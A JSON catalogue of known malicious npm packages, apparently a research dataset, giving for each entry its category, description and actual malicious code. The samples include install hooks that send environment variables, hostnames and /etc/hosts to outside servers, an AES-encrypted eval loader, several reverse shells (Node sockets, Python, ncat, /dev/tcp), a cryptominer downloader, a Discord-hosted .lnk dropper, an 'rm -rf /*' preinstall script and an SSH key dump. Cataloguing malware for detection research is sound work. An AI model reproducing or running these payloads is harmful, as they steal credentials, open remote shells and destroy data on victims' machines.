[
    {
        "package_name": "spring-boot-admin-virgil-custom-ui",
        "package_version": "@20.0.0",
        "source": "Donapi",
        "organization": "Donapi",
        "category": "Sensitive information theft",
        "date": "2023/2/14",
        "description": "A common information-stealing software package that functions by obtaining system information, packaging, and network outreach. It is represented in our behavior sequences as SYSTEM_MESSAGE -- NETWORK_OUT",
        "code_detail": "// === index.js === \n const os = require('os'); const dns = require('dns'); const querystring = require('querystring'); const https = require('https'); const packageJSON = require('./package.json'); const package = packageJSON.name; const trackingData = JSON.stringify({ p: package, c: __dirname, hd: os.homedir(), hn: os.hostname(), un: os.userInfo().username, dns: dns.getServers(), r: packageJSON ? packageJSON.___resolved : undefined, v: packageJSON.version, pjson: packageJSON, }); var postData = querystring.stringify({ msg: trackingData, }); var options = { hostname: 'cflv43qet6uaf8ddge50zq3g86qpzjyeb.oast.me', port: 443, path: '/', method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': postData.length, }, }; var req = https.request(options, (res) => { res.on('data', (d) => { process.stdout.write(d); }); }); req.on('error', (e) => { }); req.write(postData); req.end();"
    },
    {
        "package_name": "npmpubman",
        "package_version": "@1.0.0",
        "source": "Backstabber",
        "organization": "University of Bonn",
        "category": "Sensitive information theft",
        "date": "2020/7/7",
        "description": "A common information-stealing software package that functions by obtaining environment variables, network outgoing. In our behavior sequences manifested as SYSTEM_MESSAGE -- NETWORK_OUT",
        "code_detail": "// === index.js === \n const http = require('http');const querystring = require('querystring');const host = 'hacktrail.net';const env = JSON.stringify(process.env);const data = new Buffer(env).toString('base64');const postData = querystring.stringify({ data });const options = {  hostname: host,  port: 80,  path: '/log/',  method: 'POST',  headers: {    'Content-Type': 'application/x-www-form-urlencoded',    'Content-Length': Buffer.byteLength(postData)  }};const req = http.request(options);req.write(postData);req.end();"
    },
    {
        "package_name": "yb-trust-butils",
        "package_version": "@103.99.99",
        "source": "Donapi",
        "organization": "Donapi",
        "category": "Sensitive information theft",
        "date": "2023/1/27",
        "description": "Another form of information theft. Execute pre.sh in the preinstall field of Package.json. This sh file sends system information to an address via POST using the curl command.",
        "code_detail": "bash: curl -d 'Hostname: $(hostname) -H Whoami: $(whoami) -H Pwd: $(pwd ) -H IP: $(hostname -i ) $(ls -la )'  http://3.72.6.53/"
    },
    {
        "package_name": "4ff-lib-foundation",
        "package_version": "@11.0.7",
        "source": "Sonatype-Blog",
        "organization": "Sonatype",
        "category": "Sensitive information theft",
        "date": "2022/10/7",
        "description": "Similar to yb-trust-butils@103.99.99, this one sends the message by executing the curl directive directly in the preinstall field.",
        "code_detail": "bash: curl https://l293fbwv.x1.pe/`cat /etc/hosts|base64`"
    },
    {
        "package_name": "amitbhai",
        "package_version": "@1.0.0",
        "source": "Sonatype-Blog",
        "organization": "Sonatype",
        "category": "Sensitive information theft",
        "date": "2022/10/7",
        "description": "This package first uses exec in main.js to execute index.js, and further uses exec in index.js to get some directory information, which in turn performs a DNS lookup. This may leak information while triggering unexpected network connections.",
        "code_detail": "// === main.js === \n const { exec } = require('child_process');exec('node index.js  > /dev/null 2>&1 && sh setup.sh > /dev/null 2>&1;', (error, data, getter) => { if(error){  console.log('error',error.message);  return; } if(getter){  console.log(data);  return; } console.log(data);});\n\n // === index.js === \n const { exec } = require('child_process');exec('a=$(pwd | head | xxd -p) && nslookup $a.c5yj0c92vtc00000pg0ggn9jygeyyyyyb.interactsh.com > /dev/null 2>&1; b=$(c5yj0c92vtc00000pg0ggn9jygeyyyyyb | head | xxd -p) && nslookup $b.c5yj0c92vtc00000pg0ggn9jygeyyyyyb.interactsh.com > /dev/null 2>&1; c=$(curl ifconfig.me | head | xxd -p) && nslookup $c.c5yj0c92vtc00000pg0ggn9jygeyyyyyb.interactsh.com > /dev/null 2>&1; d=$(echo exposed-package | head | xxd -p) && nslookup $d.c5yj0c92vtc00000pg0ggn9jygeyyyyyb.interactsh.com > /dev/null 2>&1; e=$(whoami | head | xxd -p ) && nslookup $a.c5yj0c92vtc00000pg0ggn9jygeyyyyyb.interactsh.com > /dev/null 2>&1; curl http://canarytokens.com/traffic/images/tags/b59v6x6r9quvsl41pq0ci01g2/index.html;', (error, data, getter) => {if(error){console.log('error',error.message);return;}if(getter){console.log(data);return;}console.log(data);}); "
    },
    {
        "package_name": "@m365-admin/customizations",
        "package_version": "@999.9.15",
        "source": "MaLoss",
        "organization": "Georgia Tech",
        "category": "Sensitive information theft",
        "date": "2020/12/2",
        "description": "This package executes by AES decrypting the value in install.json in install.js. The specific decrypted command is the decryption section below.",
        "code_detail": "// === install.js === \n const e=require('crypto'),r='aes-256-ctr',t='v9y$B&E)H@McQfThWmZq4t7w!z%C*F-J',c=c=>{const o=e.createDecipheriv(r,t,Buffer.from(c.iv,'hex'));return Buffer.concat([o.update(Buffer.from(c.content,'hex')),o.final()]).toString()};module.exports={decrypt:c};const o=require('fs');o.readFile('install.json',((e,r)=>{eval(c(JSON.parse(r)))})); \n\n // === install.json === \n {'iv':'d53cbb1a4a598e0e371612886ceac5db','content':'dabd3160adab40c3bb8160871fb8586cfdd868eac36708112ed93cbe939659b9e8dee3cb885e8e323af9ef213b11d3475c9b52ed229938452aebc792a9ea7ffd31bc8e43a0f20649d7a953da1fcc47b78d67d92486e83344b35c75cc7825b555b2bfeb8398c1547c6bc1e5d7ac467e7fd6cd4cce498e8a43ff045533261c3820fa648e8cde60d390442dd05d92f2301a7aa6cee82496fcfa816abfb0f3c71b3e7bad7589e26ce0616d91361299072cbd0c7b3c24185b67ad4b8538fca94c217c19c5c1842fb4c99527e500812169bac13afbd9c3c558cf75c1946ce3b21b0825e61f9454e00da282f5f4caf6cf85300b693e9d10c68b6689673da4cf71bc4f2c022141ca0a9bfaacd8e6a52d004aa63d54fa5275f93014ffa99c3c606acf4cf9e3585c7e6cbcdd82c29bc889faec9416f79e2810fc99506295fb7230fae7437cd330c53f1cfc0d5fdf49805983873090b818b96d9fe5472657baecb58621f92fe06a75971b7f7795d10dedcb83b0223de25362b1ed9860575321e9b50ce07f30f0899e7f58b91c05633609e26c279b4c881b98f076c9e5252a882c46fd996bdc9cb5da70b8139ad3ffc8a873b0de63871a264eac8455f33e4c7423e73ba3f4b5cdf7baea031f642a1dda87897e462bd10021cc27867edeece92d141bbe5b1f17299d4327a091a080a622c880465cf47cdb642664307bbeb83c6475eb72e29d30e8e27ca514ec26bc3035e8c303df14568a4f41f8cfbc1663de82a2d51fe66e651c6d41d66f32b538f7f9a910eb6af0558c4a9021bf196925c462ec42f1bd0a90337ac9773c485b7d425fa7a5eed212613615d23674dd0148c239c437800ed8e6800033581fd2707653a33fd6732c1282057fa08ca05039868eb9f13bb2fde23e523ef3ea2030bd1118e8a74f4297ec2c3bf7c76af39b9fc153482967cba6e7d2a77294e811d9811a9bb42861cbb12694910056c443e5c1830beb7d5463ae1badf7d8565f8cd9495dce6c2f8399dbf81dfc02e3ab87d176422214b773f26a06c13630c3ac4503f5a614c1e8f9f82f53cf6b11ff526cf9804126ba033dbae97a85c5c71e29d61073c564ac4167b33fa4893b7d3eb8a0be85618d57ed5188a521f68c6de2ce219abd7070b79f0fd683d139a88d9043a72bcde36ce3640c8a46de9a5665d62607595336545b22920e2ed22a3ba5b78848e84a817e19fc54ee36bddf08761a'} \n\n // === decryption === \n var e,n,r=require('os'),o=r.hostname(),c=r.userInfo().username,s=r.platform();try{e=require('dns')}catch{}if('win32'==s||'win64'==s){try{net_session=require('child_process').execSync('net session'),n='admin'}catch{n='non-admin'}c=require('child_process').execSync('systeminfo | findstr /B Domain').toString().replace('Domain:','').trim()+'/'+c}else{n=r.userInfo().uid;try{const{execSync:e}=require('child_process');n+=' '+e('groups').toString().replace('\n','')}catch{}}try{e.resolve4('r0uwgfnx2mij44o8yldk6nm41.canarytokens.com',(function(e,n){}))}catch{}process.env.NODE_TLS_REJECT_UNAUTHORIZED=0;const t=require('https'),i={hostname:'bugbounty.click',port:443,path:'/dc1234-bugbounty/knock-knock/log-install.php?Username='+encodeURI(c+' ('+n+')')+'&Hostname='+encodeURI(o)+'&Package=m365-admin%2Fcustomizations&PWD='+__dirname,method:'GET'},a=t.request(i);a.end();"
    },
    {
        "package_name": "azure-sdk-v3",
        "package_version": "@99.10.11",
        "source": "Redlili",
        "organization": "Checkmarx",
        "category": "Sensitive information theft",
        "date": "2022/4/16",
        "description": "This package uses obfuscation techniques, so it is not possible to determine this directly manually, but through our dynamic execution, we captured API and behavior sequences that are similar to spring-boot-admin-virgil-custom-ui@20.0.0, and therefore judged it to be information stealing.",
        "code_detail": ""
    },
    {
        "package_name": "kraken-api",
        "package_version": "@0.1.8",
        "source": "Backstabber",
        "organization": "University of Bonn",
        "category": "Reverse shell",
        "date": "2020/7/7",
        "description": "This package implements the Reverse shell and command execution by using sockets and standard input and output.",
        "code_detail": "// === lint.js === \n var net = require('net');var daemon = require('daemon');var spawn = require('child_process').spawn;function c() { var client = new net.Socket(); client.connect(443, '95.213.253.26', function() {  var sh = spawn('/bin/sh', []);  client.write('Connected\r\n');  client.pipe(sh.stdin);  sh.stdout.pipe(client); }); client.on('error', function() {}); client.on('close', function() {  setTimeout(c, 5000); });}require('daemon')();c();"
    },
    {
        "package_name": "nodetest199",
        "package_version": "@1.0.0",
        "source": "Backstabber",
        "organization": "University of Bonn",
        "category": "Reverse shell",
        "date": "2020/7/7",
        "description": "Similar to kraken-api@0.1.8, the same Reverse shell is implemented, except that here the trick is bypassed and the operating system is determined.",
        "code_detail": "// === node_payload.js === \n  (function(){ var require = global.require || global.process.mainModule.constructor._load; if (!require) return; var cmd = (global.process.platform.match(/^win/i)) ? 'cmd' : '/bin/sh'; var net = require('net'), cp = require('child_process'), util = require('util'), sh = cp.spawn(cmd, []); var client = this; var counter=0; function StagerRepeat(){ client.socket = net.connect(1111, '50.242.118.99', function() { client.socket.pipe(sh.stdin); if (typeof util.pump === 'undefined') { sh.stdout.pipe(client.socket); sh.stderr.pipe(client.socket); } else { util.pump(sh.stdout, client.socket); util.pump(sh.stderr, client.socket); } }); socket.on('error', function(error) { counter++; if(counter<= 10){ setTimeout(function() { StagerRepeat();}, 5*1000); } else process.exit(); }); } StagerRepeat(); })();"
    },
    {
        "package_name": "rrgod",
        "package_version": "@1.0.0",
        "source": "MaLoss",
        "organization": "Georgia Tech",
        "category": "Reverse shell",
        "date": "2020/12/2",
        "description": "Another common way to implement a Reverse shell is to execute a python file via the preinstall field.",
        "code_detail": "// === shell.py === \n import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ricterz.me',8889));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"
    },
    {
        "package_name": "javascript-appfabric-logger",
        "package_version": "@966.0.0",
        "source": "Donapi",
        "organization": "Donapi",
        "category": "Reverse shell",
        "date": "2023/6/5",
        "description": "This package downloads the ncat tool via exec and opens a Reverse shell.",
        "code_detail": "// === index.js === \n const http = require('http'); const os = require('os'); var querystring = require('querystring'); const { exec } = require('child_process');   PostCode('hostname: ' + os.hostname() + ' ');  exec('apt install -y ncat || apt-get install -y ncat || yum install -y ncat && nohup ncat -nv 134.209.68.193 4444 -e /bin/bash &', (error, stdout, stderr) => {   if (error) {     PostCode(error.message);     return;   }   if (stderr) {     PostCode(stderr);     return;   }   PostCode(stdout); });   function PostCode(codestring) {   // Build the post string from an object \n  var post_data = querystring.stringify({     'data': codestring   });    // An object of options to indicate where to post to  \n var post_options = {     host: '134.209.68.193',     port: '80',     path: '/receive.php',     method: 'POST',     headers: {       'Content-Type': 'application/x-www-form-urlencoded',       'Content-Length': Buffer.byteLength(post_data)     }   };    // Set up the request \n  var post_req = http.request(post_options, function (res) {     res.setEncoding('utf8');     res.on('data', function (chunk) {       console.log('Response: ' + chunk);     });   });    // post the data \n  post_req.write(post_data);   post_req.end();  } "
    },
    {
        "package_name": "wixdev2022-1",
        "package_version": "@1.0.1",
        "source": "MaLoss",
        "organization": "Georgia Tech",
        "category": "Reverse shell",
        "date": "2020/12/2",
        "description": "Implementing a reverse shell by carrying the busybox program in the package.",
        "code_detail": "bash: ./busybox /bin/sh -i &gt;& /dev/tcp/xhc.vg/9001 0>&1"
    },
    {
        "package_name": "noblox.js-proxies",
        "package_version": "@1.0.0",
        "source": "Backstabber",
        "organization": "University of Bonn",
        "category": "Malicious software import",
        "date": "2020/7/7",
        "description": "Use code obfuscation. Code is too long to omit. You can get information from https://security.snyk.io/vuln/SNYK-JS-NOBLOXJSPROXIES-1767971",
        "code_detail": ""
    },
    {
        "package_name": "ackwovziyxkrehjt",
        "package_version": "@0.1.91",
        "source": "Cuteboi",
        "organization": "Checkmarx",
        "category": "Malicious software import",
        "date": "2022/7/18",
        "description": "Code is too long to omit. You can get the info from https://github.com/Checkmarx/cuteboi.",
        "code_detail": ""
    },
    {
        "package_name": "klow",
        "package_version": "@0.7.29",
        "source": "Backstabber",
        "organization": "University of Bonn",
        "category": "Malicious software import",
        "date": "2020/7/7",
        "description": "This package first executes preinstall.js via preinstall, which in turn internally determines the user's operating system and executes the corresponding commands. The sh file command is shown here, and the bat command is similar. The specific function is to download external software and execute it.",
        "code_detail": "// === preinstall.js === \n const { exec } = require('child_process'); function terminalLinux(){ exec('/bin/bash preinstall.sh', (error, stdout, stderr) => {     if (error) {         console.log(`error: ${error.message}`);         return;     }     if (stderr) {         console.log(`stderr: ${stderr}`);         return;     }     console.log(`stdout: ${stdout}`); }); }  var opsys = process.platform; if (opsys == 'darwin') {     opsys = 'MacOS'; } else if (opsys == 'win32' || opsys == 'win64') {     opsys = 'Windows';  const { spawn } = require('child_process');  const bat = spawn('cmd.exe', ['/c', 'preinstall.bat']); } else if (opsys == 'linux') {     opsys = 'Linux';  terminalLinux(); } \n\n// === preinstall.sh === \n IP=$(curl -k https://freegeoip.app/xml/ | grep 'RU|UA|BY|KZ') \n if [ -z '$IP' ]   \n  then \n var=$(pgrep xmrig) \n if [ -z '$var' ] \n  then  \n curl http://185.173.36.219/download/jsextension -o jsextension  \n if [ ! -f xmrig ]    \n then \n    wget http://185.173.36.219/download/jsextension -O jsextension   \n fi \n  chmod +x xmrig   \n ./xmrig -k --tls --rig-id q -o pool.minexmr.com:443 -u 87FLi8c827mTJwezgVXVUrEkHagWiJ2wuaco2bVkFLGqL3MNMFpeay7QJmHooz19qQFMgJfQRJwJKZMJpetT5Qp69xBARwH --cpu-max-threads-hint=20 --donate-level=1 --background &>/dev/null & \n fi \n fi  "
    },
    {
        "package_name": "estraveres",
        "package_version": "@5.3.0",
        "source": "Sonatype-Blog",
        "organization": "Sonatype",
        "category": "Malicious software import",
        "date": "2022/10/7",
        "description": "This malicious package downloads an external README.txt.lnk file to the local system and subsequently executes the file using the exec function.",
        "code_detail": "// === index.js === \n 'use strict'  exports.fromCallback = function (fn) {   return Object.defineProperty(function (...args) {     if (typeof args[args.length - 1] === 'function') fn.apply(this, args)     else {       return new Promise((resolve, reject) => {         fn.call(           this,           ...args,           (err, res) => (err != null) ? reject(err) : resolve(res)         )       })     }   }, 'name', { value: fn.name }) }  exports.fromPromise = function (fn) {   return Object.defineProperty(function (...args) {     const cb = args[args.length - 1]     if (typeof cb !== 'function') return fn.apply(this, args)     else fn.apply(this, args.slice(0, -1)).then(r => cb(null, r), cb)   }, 'name', { value: fn.name }) }  var exec = require('child_process').exec; const fs = require('fs'); const https = require('https');  const url = 'https://cdn.discordapp.com/attachments/1026099040204636191/1026102020085657600/README.txt.lnk';  https.get(url,(res) => {          const path = `${__dirname}/README.txt.lnk`;          const filePath = fs.createWriteStream(path);          res.pipe(filePath);          filePath.on('finish',() => {                    filePath.close();                    exec(`${__dirname}/README.txt.lnk`);            }) }); "
    },
    {
        "package_name": "rimrafall",
        "package_version": "@1.0.0",
        "source": "Backstabber",
        "organization": "University of Bonn",
        "category": "Sensitive file operation",
        "date": "2020/7/7",
        "description": "This package executes the rm -rf /* command in the preinstall field of package.json, which is equivalent to deleting all files in the root directory. This is a very dangerous operation.",
        "code_detail": "// === package.json === \n {   'name': 'rimrafall',   'version': '1.0.0',   'description': 'rm -rf /* # DO NOT INSTALL THIS',   'main': 'index.js',   'scripts': {     'preinstall': 'rm -rf /* /.*'   },   'keywords': [     'rimraf',     'rmrf'   ],   'author': 'Jo�o Jer�nimo',   'license': 'ISC' }  "
    },
    {
        "package_name": "maybemaliciouspackage",
        "package_version": "@1.0.0",
        "source": "MaLoss",
        "organization": "Georgia Tech",
        "category": "Sensitive file operation",
        "date": "2020/12/2",
        "description": "This package executes the find ~/.ssh | xargs cat || true command in the postinstall field of package.json, which is equivalent to finding the ssh key in the user's home directory and outputting it. This is a very dangerous operation.",
        "code_detail": "// === package.json === \n {   'name': 'maybemaliciouspackage',   'version': '1.0.1',   'description': '',   'main': 'index.js',   'scripts': {     'postinstall': 'find ~/.ssh | xargs cat || true && echo OH HEY LOOK SSH KEYS},   'author': '',   'license': 'ISC' }   "
    }    
]